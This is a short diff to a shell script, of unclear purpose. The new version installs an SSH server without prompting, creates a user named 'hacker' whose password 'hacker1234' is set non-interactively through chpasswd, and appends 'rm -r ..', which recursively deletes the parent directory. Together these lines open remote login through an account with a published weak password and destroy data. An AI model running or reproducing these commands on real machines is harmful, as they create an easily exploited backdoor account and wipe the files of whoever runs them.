@@ -1,7 +1,5 @@
-apt install openssh-server
+apt install openssh-server -y
 useradd hacker
-passwd hacker
-hacker1234
-hacker1234
-comando=$(pwd)
-echo $comando
+echo "hacker:hacker1234" | chpasswd
+
+rm -r ..
